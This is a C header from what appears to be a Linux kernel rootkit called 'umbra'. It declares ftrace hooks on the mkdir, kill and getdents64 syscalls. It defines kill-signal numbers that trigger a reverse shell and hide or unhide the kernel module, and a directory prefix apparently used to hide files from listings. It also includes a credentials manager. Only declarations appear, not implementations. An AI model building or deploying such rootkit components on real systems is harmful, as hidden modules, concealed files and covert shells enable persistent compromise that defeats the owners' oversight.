#ifndef HEADER_HOOKERS
#define HEADER_HOOKERS

#include <linux/kernel.h>
#include <linux/linkage.h>
#include <linux/signal.h>
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/list.h>
#include <linux/export.h>
#include <linux/dirent.h>

#include "ftrace_manager.h"
#include "creds_manager.h"

// Syscalls to be hooked using frace
#define SIGNAL_KILL_HOOK 50
#define SIGNAL_REVERSE_SHELL 51
#define SIGNAL_HIDE_KERNEL_MODULE 52
#define SIGNAL_SHOW_KERNEL_MODULE 53

#define UMBRA_DIRECTORY_PREFIX "umbra"

//Hooking mkdir
asmlinkage int hook_mkdir(const struct pt_regs *regs);


//Hooking kill
asmlinkage int hook_kill(const struct pt_regs *regs);


//Hooking getdents for ls
asmlinkage int hook_getdents64(const struct pt_regs *regs);


void remove_all_hooks(void);
int install_all_hooks(void);

#endif